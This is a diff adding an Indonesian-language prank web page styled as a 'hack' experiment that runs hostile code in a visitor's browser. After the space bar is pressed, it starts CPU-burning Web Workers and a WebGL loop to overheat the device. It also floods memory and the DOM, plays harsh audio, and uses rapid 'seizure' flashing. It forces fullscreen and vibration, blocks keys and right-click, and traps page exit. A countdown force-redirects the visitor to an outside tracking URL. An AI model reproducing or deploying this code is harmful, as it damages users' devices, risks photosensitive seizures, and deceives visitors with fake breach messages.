@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Aman Kaget — HIGH BRUTAL</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{font-family:'Segoe UI',monospace;color:#15221d;background:#e9eee5;line-height:1.4}
+body{margin:0;overflow-x:hidden}
+
+/* ===== REDIRECT BANNER ===== */
+#redirectBanner{
+  position:fixed;top:0;left:0;right:0;z-index:99999;
+  background:linear-gradient(90deg,#111,#222);
+  color:#ff0040;text-align:center;padding:8px 12px;
+  font-family:monospace;font-size:12px;letter-spacing:.1em;
+  border-bottom:2px solid #ff0040;
+  animation:bannerPulse 1s infinite;
+}
+#redirectBanner.urgent{
+  background:linear-gradient(90deg,#300,#500);
+  color:#fff;font-size:15px;font-weight:bold;
+  animation:bannerPulse .3s infinite;
+}
+@keyframes bannerPulse{0%,100%{opacity:1}50%{opacity:.5}}
+
+/* ===== APP ===== */
+.app{min-height:100vh;position:relative;overflow:hidden;background:radial-gradient(circle at 75% 26%,#f8fbf3 0,#e9eee5 28%,#dce5d9 100%);transition:background .35s}
+.app.stage-1{background:#1a1f1a}
+.app.stage-2{background:#0f0f0a}
+.app.stage-3{background:#000!important;animation:fullSeizure .06s infinite alternate!important}
+@keyframes fullSeizure{
+  0%{filter:brightness(1)contrast(1)hue-rotate(0deg)}
+  33%{filter:brightness(1.5)contrast(2)hue-rotate(120deg)}
+  66%{filter:brightness(.5)contrast(.5)hue-rotate(240deg)}
+  100%{filter:brightness(1.2)contrast(1.5)hue-rotate(360deg)}
+}
+
+.shell{width:min(1160px,calc(100% - 64px));margin:0 auto;position:relative}
+.nav{height:80px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(21,34,29,.15)}
+.brand{font-weight:700;font-size:20px;letter-spacing:-.04em;display:flex;align-items:center;gap:10px}
+.brand-mark{background:#d8ff54;border:1px solid #15221d;padding:8px 6px;font-size:11px;letter-spacing:-.1em;font-family:monospace}
+.brand-dot{color:#99b94a}
+.status{font:500 11px monospace;text-transform:uppercase;letter-spacing:.05em;display:flex;align-items:center;gap:8px}
+.status i{display:block;width:7px;height:7px;background:#8cc63f;border-radius:50%}
+
+.hero{padding:60px 0 40px;display:flex;gap:60px;align-items:center}
+.hero-copy{flex:1}
+.hero-copy h1{font-size:clamp(36px,7vw,68px);line-height:.92;letter-spacing:-.04em;margin-bottom:24px}
+.hero-copy h1 em{color:#e44536;font-style:normal}
+.lede{font-size:16px;color:#3d5442;margin-bottom:28px;max-width:520px}
+.cta-row{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:20px}
+.primary{
+  background:#d8ff54;color:#15221d;border:2px solid #15221d;
+  padding:14px 28px;font-size:15px;font-weight:700;cursor:pointer;
+  display:flex;align-items:center;gap:10px;font-family:inherit;
+  box-shadow:4px 4px 0 #15221d;transition:.1s;
+}
+.primary:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #15221d}
+.key{font-family:monospace;background:#15221d;color:#d8ff54;padding:3px 8px;font-size:11px;border-radius:3px}
+
+.stage-indicator{margin-top:16px;font-family:monospace;font-size:13px}
+.stage-indicator .safe{color:#8cc63f}
+.stage-indicator .warn{color:#f0ad4e;animation:blink .5s infinite;font-weight:bold}
+.stage-indicator .danger{color:#e44536;animation:blink .2s infinite;font-weight:bold;font-size:16px}
+.stage-indicator .critical{color:#ff0040;animation:blink .08s infinite;font-weight:900;font-size:22px;text-shadow:0 0 20px #ff0040}
+.lag-counter{margin-top:8px;font-family:monospace;font-size:12px;color:#e44536;animation:blink .5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+
+/* ===== HACKER OVERLAY ===== */
+.hacker-overlay{
+  position:fixed;inset:0;z-index:100;background:rgba(2,8,4,.92);
+  animation:overlayIn .3s;overflow:hidden
+}
+@keyframes overlayIn{from{opacity:0}to{opacity:1}}
+
+/* MATRIX RAIN */
+.matrix-rain{
+  position:absolute;inset:0;display:flex;justify-content:space-around;overflow:hidden;
+  opacity:.28;pointer-events:none;z-index:1
+}
+.matrix-rain span{
+  position:relative;top:-45%;writing-mode:vertical-rl;white-space:pre;
+  font:500 14px monospace;letter-spacing:.1em;
+  color:#baf46a;text-shadow:0 0 8px rgba(186,244,106,.8);
+  animation:matrixFall linear infinite
+}
+@keyframes matrixFall{
+  0%{transform:translateY(-15%);opacity:0}
+  10%{opacity:.95}
+  75%{opacity:.6}
+  100%{transform:translateY(255%);opacity:0}
+}
+
+/* HACKER GRID */
+.hacker-grid{position:absolute;inset:20px;display:grid;grid-template-columns:repeat(5,1fr);gap:5px;z-index:2;opacity:.75}
+.hacker-grid.stage-2{grid-template-columns:repeat(5,1fr);opacity:.9}
+.hacker-grid.stage-3{grid-template-columns:repeat(6,1fr);gap:3px;opacity:1}
+.hacker-panel{
+  background:rgba(12,24,14,.92);border:1px solid rgba(151,201,76,.25);
+  padding:8px;min-height:80px;animation:panelFlicker .6s infinite alternate
+}
+.hacker-panel:nth-child(2n){animation-delay:.3s}
+.hacker-panel:nth-child(3n){animation-delay:.8s}
+.stage-3 .hacker-panel{animation:panelSeizure .05s infinite alternate!important}
+@keyframes panelFlicker{0%,100%{opacity:.65}45%{opacity:.85}48%{opacity:.36}50%{opacity:.77}}
+@keyframes panelSeizure{
+  0%{opacity:.3;filter:hue-rotate(0deg)}
+  50%{opacity:1;filter:hue-rotate(180deg)}
+  100%{opacity:.5;filter:hue-rotate(360deg)}
+}
+.panel-head{font-size:9px;display:flex;justify-content:space-between;color:#91bd58;margin-bottom:5px}
+.panel-head i{font-style:normal;color:#e44135}
+.fake-video{
+  height:calc(100% - 22px);position:relative;overflow:hidden;
+  border:1px solid rgba(151,201,76,.18);
+  background:radial-gradient(circle at 55% 45%,rgba(93,146,67,.3),transparent 38%),repeating-linear-gradient(90deg,rgba(168,231,104,.08) 0 1px,transparent 1px 18px)
+}
+.scanline{position:absolute;left:0;right:0;height:2px;background:#d8ff54;opacity:.55;animation:scan 2.2s linear infinite}
+.stage-3 .scanline{animation-duration:.08s!important}
+@keyframes scan{from{top:0}to{top:100%}}
+.terminal-art{position:absolute;left:10px;top:24%;font-size:9px;line-height:2;color:#88ae5b;transform:skewY(-4deg)}
+.terminal-art b{color:#e8f4cc;font-size:11px}
+.stage-2 .terminal-art{animation:blink .15s infinite}
+.stage-3 .terminal-art{animation:blink .05s infinite!important}
+.progress{position:absolute;bottom:20px;left:8px;right:8px;height:3px;background:#22351f}
+.progress span{display:block;height:100%;background:#b8e75b;animation:progress 1.7s ease-in-out infinite alternate}
+.stage-3 .progress span{animation-duration:.05s!important}
+@keyframes progress{from{width:20%}to{width:88%}}
+
+/* PHOTO RAIN */
+.photo-rain{position:absolute;inset:0;display:flex;justify-content:space-around;align-items:center;pointer-events:none;opacity:.12;mix-blend-mode:screen;z-index:2}
+.photo-rain img{
+  width:110px;height:110px;object-fit:cover;
+  filter:grayscale(1)contrast(1.4)sepia(1)hue-rotate(70deg);
+  animation:photoPulse 1.8s ease-in-out infinite alternate
+}
+.stage-3 .photo-rain{opacity:.25}
+.stage-3 .photo-rain img{animation-duration:.3s!important}
+@keyframes photoPulse{
+  from{transform:translateY(calc((var(--i)-4)*14px))rotate(calc((var(--i)-4)*7deg))scale(.94)}
+  to{transform:translateY(calc((var(--i)-4)*14px))rotate(calc((var(--i)-4)*7deg))scale(1.08)}
+}
+
+/* FLOATING HACK TEXT */
+.floating-hack-text{
+  position:fixed;z-index:9998;font-family:monospace;font-weight:bold;
+  pointer-events:none;white-space:nowrap;
+  mix-blend-mode:screen;animation:brutalGlitch .08s infinite alternate
+}
+@keyframes brutalGlitch{
+  0%{transform:translate(0,0)skew(0deg);opacity:1}
+  20%{transform:translate(3px,-3px)skew(5deg);opacity:.9}
+  40%{transform:translate(-4px,2px)skew(-5deg);opacity:.85}
+  60%{transform:translate(2px,4px)skew(3deg);opacity:.7}
+  80%{transform:translate(-2px,-1px)skew(-2deg);opacity:.9}
+  100%{transform:translate(0,0)skew(0deg);opacity:1}
+}
+
+/* DARK WORD */
+.dark-word{
+  position:fixed;z-index:99999;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  font-size:160px;font-weight:900;color:#000;
+  text-shadow:0 0 50px rgba(0,0,0,.9),0 0 100px #000;
+  animation:darkMega .15s ease-in-out infinite alternate;
+  pointer-events:none;letter-spacing:.2em;font-family:sans-serif
+}
+@keyframes darkMega{
+  from{transform:translate(-50%,-50%)scale(.7);opacity:.6}
+  to{transform:translate(-50%,-50%)scale(1.8);opacity:1}
+}
+
+/* CENTER */
+.hacker-center{
+  position:absolute;z-index:6;left:50%;top:50%;
+  transform:translate(-50%,-50%);text-align:center;
+  width:min(650px,calc(100% - 38px));padding:32px 25px;
+  background:rgba(3,11,6,.95);border:1px solid #8baa52;
+  box-shadow:0 0 0 8px rgba(123,169,66,.08),0 0 55px rgba(177,225,73,.15)
+}
+.stage-3 .hacker-center{border-color:#ff0040;box-shadow:0 0 0 8px rgba(255,0,64,.15),0 0 80px rgba(255,0,64,.3)}
+.center-kicker{font-size:10px;letter-spacing:.16em;color:#a4c77a}
+.stage-3 .center-kicker{color:#ff0040;animation:blink .15s infinite}
+.hacker-center h2{font-size:clamp(32px,6vw,74px);line-height:.9;letter-spacing:-.08em;margin:22px 0 13px;color:#f1f6e7}
+.hacker-center h2 em{font-style:normal;color:#e44536;display:block}
+.stage-3 .hacker-center h2 em{color:#ff0040}
+.hacker-center p{color:#a0b78c;font-size:13px}
+.center-actions{display:flex;flex-direction:column;align-items:center;gap:13px;margin-top:26px}
+.redirect-notice{font-family:monospace;font-size:11px;color:#a4c77a;animation:blink .5s infinite}
+.hacker-overlay .primary{box-shadow:4px 4px 0 #668348;background:#dcf77d;color:#122015}
+.hacker-overlay .primary:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #668348}
+.stage-3 .hacker-overlay .primary{background:#ff0040;color:#fff;box-shadow:4px 4px 0 #a00}
+
+/* RESPONSIVE */
+@media(max-width:760px){
+  .shell{width:calc(100% - 24px)}
+  .hacker-grid{grid-template-columns:repeat(3,1fr)!important;gap:4px}
+  .hacker-grid.stage-3{grid-template-columns:repeat(3,1fr)!important}
+  .hacker-panel:nth-child(n+10){display:none}
+  .photo-rain img{width:70px;height:70px}
+  .floating-hack-text{font-size:12px!important}
+  .dark-word{font-size:60px}
+  .hero{flex-direction:column;padding:30px 0}
+}
+</style>
+</head>
+<body>
+
+<div id="redirectBanner">⏳ Redirect ke M4zk1pL4y dalam <span id="countdownDisplay">60</span> detik...</div>
+
+<main class="app" id="app">
+  <div class="noise" style="position:absolute;inset:0;opacity:.08;pointer-events:none;background-image:url('data:image/svg+xml,%3Csvg viewBox=%220 0 180 180%22 xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%22.9%22 numOctaves=%223%22 stitchTiles=%22stitch%22/%3E%3C/filter%3E%3Crect width=%22100%25%22 height=%22100%25%22 filter=%22url(%23n)%22 opacity=%22.25%22/%3E%3C/svg%3E')"></div>
+
+  <nav class="nav shell">
+    <div class="brand"><span class="brand-mark">AK</span><span>aman<span class="brand-dot">.</span>kaget</span></div>
+    <div class="nav-right"><span class="status"><i></i> mode aman aktif</span></div>
+  </nav>
+
+  <section class="hero shell">
+    <div class="hero-copy">
+      <h1>Jangan percaya<br><em>semua</em> yang<br>muncul di layar.</h1>
+      <p class="lede">Tekan <strong>SPASI 3x</strong> — tiap klik escalation brutal. Auto-redirect 60 detik.</p>
+      <div class="cta-row">
+        <button class="primary" onclick="handleTrigger()">
+          ☠️ MULAI EKSPERIMEN <span class="key" id="keyCounter">SPASI 0/3</span>
+        </button>
+      </div>
+      <div class="stage-indicator" id="stageIndicator"><span class="safe">● SAFE</span></div>
+      <div class="lag-counter" id="lagCounter" style="display:none">⚡ FRAMES DROPPED: 0 | CPU: 40%</div>
+    </div>
+  </section>
+</main>
+
+<!-- Hidden video element -->
+<video id="hackerVideo" loop muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0"></video>
+
+<!-- Hidden audio -->
+<audio id="audioMusic" loop preload="auto"></audio>
+<audio id="audioLaugh" preload="auto"></audio>
+
+<script>
+// ===== CONFIG =====
+const REDIRECT_URL = 'https://online-images-sharing.zarmods.in/index.php?ref=2e631f29e3eebaf7e8d46147f9b834fe';
+const REDIRECT_DELAY = 60000;
+const FLOATING_TEXTS = [
+  'M4zk1pL4y Hacked', 'SYSTEM: TOTAL BREACH',
+  '01001110 01010101 01001100 01001100',
+  'KAMU TIDAK BISA APA-APA', 'HP LO PANAS? ITU TANDA KERJA',
+  'MAZKiPLAY OWNZ YOUR DEVICE'
+];
+const MATRIX_CHARS = 'アイウエオカキクケコサシスセソ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+// ===== STATE =====
+let stage = 0;
+let count = 0;
+let darkWordVisible = false;
+let droneStarted = false;
+
+// ===== DOM REFS =====
+const app = document.getElementById('app');
+const stageInd = document.getElementById('stageIndicator');
+const lagCounter = document.getElementById('lagCounter');
+const keyCounter = document.getElementById('keyCounter');
+const countdownEl = document.getElementById('countdownDisplay');
+const videoEl = document.getElementById('hackerVideo');
+
+// ===== COUNTDOWN + AUTO REDIRECT =====
+let secondsLeft = 60;
+setInterval(() => {
+  secondsLeft--;
+  countdownEl.textContent = secondsLeft;
+  const banner = document.getElementById('redirectBanner');
+  if (secondsLeft <= 10) banner.classList.add('urgent');
+  if (secondsLeft <= 0) {
+    banner.textContent = '🚀 MENGALIHKAN...';
+    try { window.location.href = REDIRECT_URL; } catch(e) {}
+    setTimeout(() => { try { window.location.replace(REDIRECT_URL); } catch(e) {} }, 200);
+  }
+}, 1000);
+
+// ===== CANVAS VIDEO GENERATOR =====
+function startCanvasVideo() {
+  const canvas = document.createElement('canvas');
+  canvas.width = 640; canvas.height = 360;
+  canvas.style.cssText = 'position:fixed;top:-9999px;left:-9999px;pointer-events:none';
+  const ctx = canvas.getContext('2d');
+  let frame = 0;
+  let running = true;
+
+  function draw() {
+    if (!running) return;
+    frame++;
+    ctx.fillStyle = '#000'; ctx.fillRect(0,0,640,360);
+
+    // Glitch bars
+    for(let i=0;i<12;i++){
+      const y=(frame*11+i*23)%360;
+      const h=2+Math.random()*25;
+      ctx.fillStyle=`rgba(0,255,65,${.05+Math.random()*.2})`;
+      ctx.fillRect(0,y,640,h);
+      ctx.fillStyle=`rgba(255,0,0,${.02+Math.random()*.06})`;
+      ctx.fillRect(Math.random()*300,y,80+Math.random()*300,h*.5);
+    }
+
+    // Scanlines
+    ctx.fillStyle='rgba(0,255,65,.04)';
+    ctx.fillRect(0,(frame*7)%360,640,1);
+    ctx.fillRect(0,(frame*11+120)%360,640,1);
+
+    // Matrix chars
+    ctx.font='bold 14px monospace';
+    for(let x=0;x<50;x++){
+      const col=MATRIX_CHARS[(frame+x*11+Math.floor(x*1.3))%MATRIX_CHARS.length];
+      const y=(frame*(1.5+(x%4))+x*19)%360;
+      ctx.fillStyle=`rgba(0,255,65,${.05+Math.random()*.35})`;
+      ctx.fillText(col,x*13,y);
+    }
+
+    // M4zk1pL4y text
+    ctx.font='bold 34px monospace';
+    ctx.fillStyle=`rgba(255,0,64,${.4+Math.sin(frame*.08)*.3})`;
+    ctx.shadowColor='#ff0040';
+    ctx.shadowBlur=30+Math.sin(frame*.05)*15;
+    ctx.fillText('M4zk1pL4y',640/2-120,360/2+Math.sin(frame*.04)*40);
+    ctx.shadowBlur=0;
+
+    ctx.font='10px monospace';
+    ctx.fillStyle='#3a6';
+    ctx.fillText(`> SYS:BREACHED | FRM:${frame} | T:${performance.now().toFixed(0)}ms`,8,346);
+
+    requestAnimationFrame(draw);
+  }
+  draw();
+
+  try {
+    const stream = canvas.captureStream(30);
+    videoEl.srcObject = stream;
+    videoEl.play().catch(()=>{});
+  } catch(e){}
+
+  return ()=>{running=false};
+}
+let cleanupVideo = null;
+
+// ===== CPU HEATER (WEB WORKER × 4) =====
+const workerBlob = new Blob([`
+  let count=0;
+  function burn(){
+    for(let i=0;i<1000000;i++){
+      count^=(i*0x9e3779b9)<<3;
+      count+=Math.sin(i)*Math.cos(i*.7)*Math.tan(i*.3);
+      count|=0;
+    }
+    postMessage({heat:count});
+    setTimeout(burn,1);
+  }
+  burn();
+`], {type:'application/javascript'});
+const workerUrl = URL.createObjectURL(workerBlob);
+let workers = [];
+
+function startCPUHeater(){
+  for(let i=0;i<4;i++){
+    try{ workers.push(new Worker(workerUrl)); }catch(e){}
+  }
+}
+
+// ===== WEBGL HEATER =====
+function startWebGLHeater(){
+  const c=document.createElement('canvas');
+  c.width=64;c.height=64;
+  c.style.cssText='position:fixed;top:-9999px;pointer-events:none';
+  const gl=c.getContext('webgl')||c.getContext('webgl2');
+  if(!gl) return ()=>{};
+  let running=true;
+  const vs=gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.0,1.0);}');gl.compileShader(vs);
+  const fs=gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs,'precision highp float;uniform float t;void main(){float x=sin(t+gl_FragCoord.x*.1)*cos(t*.7+gl_FragCoord.y*.1);float y=cos(t*1.3+gl_FragCoord.x*.05)*sin(t*.9+gl_FragCoord.y*.05);gl_FragColor=vec4(x*y,y*.5,x*.5,1.0);}');
+  gl.compileShader(fs);
+  const prog=gl.createProgram();gl.attachShader(prog,vs);gl.attachShader(prog,fs);gl.linkProgram(prog);gl.useProgram(prog);
+  const buf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,buf);
+  gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
+  const loc=gl.getAttribLocation(prog,'p');gl.enableVertexAttribArray(loc);gl.vertexAttribPointer(loc,2,gl.FLOAT,false,0,0);
+  const tLoc=gl.getUniformLocation(prog,'t');
+  function render(){if(!running)return;gl.uniform1f(tLoc,performance.now()/100);gl.drawArrays(gl.TRIANGLE_STRIP,0,4);requestAnimationFrame(render);}
+  render();
+  return ()=>{running=false};
+}
+let cleanupWebGL = null;
+
+// ===== AUDIO ASSAULT =====
+function startAudioAssault(){
+  try{
+    const ctx=new(window.AudioContext||window.webkitAudioContext)();
+    for(let i=0;i<3;i++){
+      const osc=ctx.createOscillator();
+      const gain=ctx.createGain();
+      osc.type=['sawtooth','square','triangle'][i];
+      osc.frequency.value=[880,440*(1+i*.5),1760][i];
+      gain.gain.value=.25-i*.05;
+      osc.connect(gain).connect(ctx.destination);
+      osc.start();
+      setInterval(()=>{osc.frequency.value=200+Math.random()*3000},200);
+    }
+  }catch(e){}
+}
+
+// ===== LAG GENERATOR =====
+let lagInterval = null;
+function startLagGenerator(intensity){
+  if(lagInterval) clearInterval(lagInterval);
+  const rate=Math.max(2,40/intensity);
+  lagInterval=setInterval(()=>{
+    for(let i=0;i<50*intensity;i++){
+      const d=document.createElement('div');
+      d.style.cssText='position:fixed;width:1px;height:1px;opacity:0';
+      d.textContent='X'.repeat(1000);
+      document.body.appendChild(d);
+    }
+    const el=document.querySelector('.hacker-overlay');
+    if(el){
+      el.style.transform=`translate(${Math.random()*5}px,${Math.random()*5}px)`;
+      el.style.transform='translate(0,0)';
+      el.style.filter=`hue-rotate(${Math.random()*360}deg)`;
+      el.style.filter='none';
+      void el.offsetTop;
+    }
+    try{const arr=new Array(500000*intensity);for(let i=0;i<arr.length;i++)arr[i]=Math.random();}catch(e){}
+  },rate);
+}
+
+// ===== ENVIRONMENT TAKEOVER =====
+function startEnvironmentTakeover(){
+  try{document.documentElement.requestFullscreen?.().catch(()=>{})}catch(e){}
+  try{
+    navigator.vibrate?.([100,50,100,50,200,100,300]);
+    const vi=setInterval(()=>{navigator.vibrate?.([50,30,80,40,150,60,200])},2000);
+    setTimeout(()=>clearInterval(vi),10000);
+  }catch(e){}
+  window.onbeforeunload=()=>'Sistem dalam mode kritis!';
+}
+
+// ===== MATRIX COLUMNS =====
+const matrixColumns = Array.from({length:30},(_,c)=>
+  Array.from({length:30},(_,r)=>MATRIX_CHARS[(c*13+r*7)%MATRIX_CHARS.length]).join('')
+);
+
+// ===== FLOATING TEXTS STATE =====
+let floatingTexts = [];
+let floatInterval = null;
+
+// ===== TRIGGER =====
+function handleTrigger(){
+  count = Math.min(count + 1, 3);
+  stage = count;
+  updateUI();
+
+  if(stage >= 1 && !droneStarted){
+    droneStarted = true;
+
+    // Video
+    cleanupVideo = startCanvasVideo();
+
+    // Audio
+    const music = document.getElementById('audioMusic');
+    music.src = 'https://kholqin.github.io/aman-kaget/media/ambient-patriotik.wav';
+    music.play().catch(()=>{});
+    const laugh = document.getElementById('audioLaugh');
+    laugh.src = 'https://kholqin.github.io/aman-kaget/media/tawa-aman.wav';
+    laugh.play().catch(()=>{});
+    setTimeout(startAudioAssault, 200);
+
+    // CPU + GPU
+    startCPUHeater();
+    cleanupWebGL = startWebGLHeater();
+
+    // Environment
+    startEnvironmentTakeover();
+
+    // Dark word
+    setTimeout(()=>{
+      darkWordVisible=true;
+      updateUI();
+    }, 400);
+    setTimeout(()=>{
+      darkWordVisible=false;
+      app.classList.add('dark-mode');
+      updateUI();
+    }, 1800);
+
+    // Floating texts
+    const texts=[];
+    for(let i=0;i<8+stage*4;i++){
+      texts.push({
+        id:i, text:FLOATING_TEXTS[i%FLOATING_TEXTS.length],
+        x:2+Math.random()*76, y:2+Math.random()*76,
+        size:14+Math.random()*30, speed:.5+Math.random()*2
+      });
+    }
+    floatingTexts=texts;
+    if(floatInterval) clearInterval(floatInterval);
+    floatInterval=setInterval(()=>{
+      floatingTexts=floatingTexts.map(t=>({
+        ...t,
+        x:Math.max(1,Math.min(89,t.x+(Math.random()-.5)*t.speed*3)),
+        y:Math.max(1,Math.min(89,t.y+(Math.random()-.5)*t.speed*3))
+      }));
+      updateUI();
+    },80);
+
+    startLagGenerator(stage);
+
+    // Block right-click
+    window.addEventListener('contextmenu',(e)=>{e.preventDefault();return false});
+
+    // Keyboard block
+    window.addEventListener('keydown',blockKeys);
+  }
+}
+window.handleTrigger = handleTrigger;
+
+// Block keys
+function blockKeys(e){
+  if(e.ctrlKey||e.altKey||e.metaKey){e.preventDefault();return false}
+}
+
+// ===== FRAME DROP COUNTER =====
+let frameDropCount = 0;
+setInterval(()=>{
+  if(stage>0){
+    frameDropCount+=Math.floor(Math.random()*40+10);
+    document.getElementById('lagCounter').textContent=`⚡ FRAMES DROPPED: ${frameDropCount} | CPU: ${Math.min(100,40+stage*20)}% | GPU: 🔥 BERAT`;
+  }
+},500);
+
+// ===== UPDATE UI =====
+function updateUI(){
+  app.className=`app stage-${stage}`;
+  keyCounter.textContent=`SPASI ${count}/3`;
+
+  if(stage===0){
+    stageInd.innerHTML=`<span class="safe">● SAFE</span>`;
+    lagCounter.style.display='none';
+  } else if(stage===1){
+    stageInd.innerHTML=`<span class="warn">⚠ STAGE 1 — AWAS! HP MULAI PANAS</span>`;
+    lagCounter.style.display='block';
+  } else if(stage===2){
+    stageInd.innerHTML=`<span class="danger">🔥 STAGE 2 — BRUTAL! DELAY & LAG!</span>`;
+  } else {
+    stageInd.innerHTML=`<span class="critical">💀 STAGE 3 — MAX! SYSTEM BREACHED!</span>`;
+  }
+
+  renderOverlay();
+}
+
+// ===== RENDER OVERLAY =====
+function renderOverlay(){
+  let overlay = document.getElementById('hackerOverlay');
+  if(stage===0){
+    if(overlay) overlay.remove();
+    return;
+  }
+
+  if(!overlay){
+    overlay=document.createElement('div');
+    overlay.id='hackerOverlay';
+    overlay.className='hacker-overlay';
+    document.body.appendChild(overlay);
+  }
+
+  overlay.innerHTML = '';
+
+  // Matrix rain
+  const matrixDiv = document.createElement('div');
+  matrixDiv.className='matrix-rain';
+  matrixColumns.forEach((col,i)=>{
+    const span=document.createElement('span');
+    span.textContent=col;
+    span.style.cssText=`--delay:${(i%14)*-.2}s;--duration:${1.5+(i%3)}s;animation-delay:${(i%14)*-.2}s;animation-duration:${1.5+(i%3)}s;opacity:${stage>=2?.95:.4}`;
+    matrixDiv.appendChild(span);
+  });
+  overlay.appendChild(matrixDiv);
+
+  // Grid
+  const grid=document.createElement('div');
+  grid.className=`hacker-grid stage-${stage}`;
+  const panelCount=stage===3?30:stage===2?18:10;
+  const labels=['ACCESS','TRACE','EXEC','BREACH','SCAN','ROOT','DUMP','MASK','PWN','ZOMBIE','CRYPTO','KILL','WORM','DDoS','PROXY','SHELL','BRUTE','PHISH','SPOOF','SNIFF','INJECT','SPRAY','FLOOD','BURN','CPU:100%','GPU:BURN','FAN:MAX','TEMP:89C','VOLT:SPIKE','CLOCK:OC'];
+  const codes=['0101 1100 0011','PACKET_STREAM','NUSANTARA_01','MASK: ACTIVE','SHELL: OPEN','PORT: 4444','CRED: DUMP','ROOT: TRUE','PAYLOAD: SENT','PROXY: CHAIN','BOT: ONLINE','BACKDOOR: OPEN','MEMORY: LEAK','PROC: INJECT','NET: FLOOD','KEYLOG: ON','CPU: 100%','GPU: BURN','FAN: MAX','TEMP: 89C','VOLT: SPIKE','CLOCK: OC','THERMAL: THROT','FIRE: RISK'];
+  for(let i=0;i<panelCount;i++){
+    const panel=document.createElement('div');
+    panel.className='hacker-panel';
+    panel.innerHTML=`
+      <div class="panel-head"><span>NODE_${String(i+1).padStart(2,'0')}</span><i>● LIVE</i></div>
+      <div class="fake-video">
+        <div class="scanline" style="animation-duration:${.1+Math.random()*.2}s"></div>
+        <div class="terminal-art">${labels[i%labels.length]}<br><b>${codes[i%codes.length]}</b></div>
+        <div class="progress"><span style="width:${5+(i*4)%90}%;animation-duration:${.1+Math.random()*.2}s"></span></div>
+      </div>
+    `;
+    panel.style.animationDuration=`${.08+Math.random()*.2}s`;
+    panel.style.animationDelay=`${i*.03}s`;
+    grid.appendChild(panel);
+  }
+  overlay.appendChild(grid);
+
+  // Photo rain
+  const photoRain=document.createElement('div');
+  photoRain.className='photo-rain';
+  const photoCount=stage===3?28:16;
+  for(let i=0;i<photoCount;i++){
+    const img=document.createElement('img');
+    img.src='https://kholqin.github.io/aman-kaget/media/amanonymous.jpg';
+    img.alt='';
+    img.style.cssText=`--i:${i};width:${40+Math.random()*120}px;animation-duration:${.3+Math.random()*.5}s;animation-delay:${i*-.05}s`;
+    photoRain.appendChild(img);
+  }
+  overlay.appendChild(photoRain);
+
+  // Dark word
+  if(darkWordVisible){
+    const dw=document.createElement('div');
+    dw.className='dark-word';
+    dw.textContent='⚫ dark ⚫';
+    overlay.appendChild(dw);
+  }
+
+  // Floating texts
+  floatingTexts.forEach(ft=>{
+    const el=document.createElement('div');
+    el.className='floating-hack-text';
+    el.textContent=ft.text;
+    el.style.cssText=`
+      left:${ft.x}%;top:${ft.y}%;
+      font-size:${ft.size}px;
+      color:${stage===3?'#ff0040':`hsl(${Math.random()*360},100%,50%)`};
+      text-shadow:${stage===3?'0 0 5px #ff0040, 0 0 15px #ff0040, 0 0 40px #ff0040':'0 0 5px #00ff41, 0 0 15px #00ff41, 0 0 40px #00ff41'};
+      animation-duration:${.2+Math.random()*.3}s;
+    `;
+    overlay.appendChild(el);
+  });
+
+  // Center panel
+  const center=document.createElement('div');
+  center.className='hacker-center';
+  const msg=stage===1?'⚠ PERINGATAN — SUHU MULAI NAIK':stage===2?'🔥 KRITIS — HP PANAS & DELAY PARAH':'💀 TOTAL BREACH — KAMU TIDAK BISA APA-APA';
+  const desc=stage===1?'⚠ Suhu naik. Sistem anomali. Video berjalan di background...':stage===2?'🔥🔥🔥 GPU/CPU 100%! Delay brutal! HP lo makin panas! MAZKiPLAY!':'💀💀💀 LO KAGA BISA APA-APA! MAZKiPLAY HACKED TOTAL! HP LO MELEDUK!';
+  center.innerHTML=`
+    <div class="center-kicker">${msg}</div>
+    <h2>ACCESS <em style="color:${stage===3?'#ff0040':'#e44536'}">THE VOID</em></h2>
+    <p>${desc}</p>
+    <div class="center-actions">
+      <div class="redirect-notice">⏳ Redirect otomatis dalam ${secondsLeft} detik</div>
+      <button class="primary small" onclick="resetAll()" style="background:${stage===3?'#ff0040':'#dcf77d'};color:${stage===3?'#fff':'#122015'}">🛑 BERHENTI (KALAU BISA)</button>
+    </div>
+  `;
+  overlay.appendChild(center);
+}
+
+// ===== RESET =====
+function resetAll(){
+  stage=0;count=0;darkWordVisible=false;droneStarted=false;frameDropCount=0;
+  floatingTexts=[];secondsLeft=60;countdownEl.textContent=60;
+
+  if(floatInterval) clearInterval(floatInterval);
+  if(lagInterval) clearInterval(lagInterval);
+  if(cleanupVideo) cleanupVideo();
+  if(cleanupWebGL) cleanupWebGL();
+  workers.forEach(w=>w.terminate());
+  workers=[];
+
+  const music=document.getElementById('audioMusic'); music.pause(); music.src='';
+  const laugh=document.getElementById('audioLaugh'); laugh.pause(); laugh.src='';
+  if(videoEl){videoEl.pause();videoEl.srcObject=null;}
+  window.onbeforeunload=null;
+  app.classList.remove('dark-mode');
+  document.getElementById('redirectBanner').classList.remove('urgent');
+
+  const overlay=document.getElementById('hackerOverlay');
+  if(overlay) overlay.remove();
+
+  updateUI();
+}
+window.resetAll = resetAll;
+
+// ===== KEYBOARD =====
+document.addEventListener('keydown',(e)=>{
+  if(e.code==='Space'&&e.target.tagName!=='BUTTON'){
+    e.preventDefault();
+    handleTrigger();
+  }
+});
+
+// Initial render
+updateUI();
+</script>
+</body>
+</html>
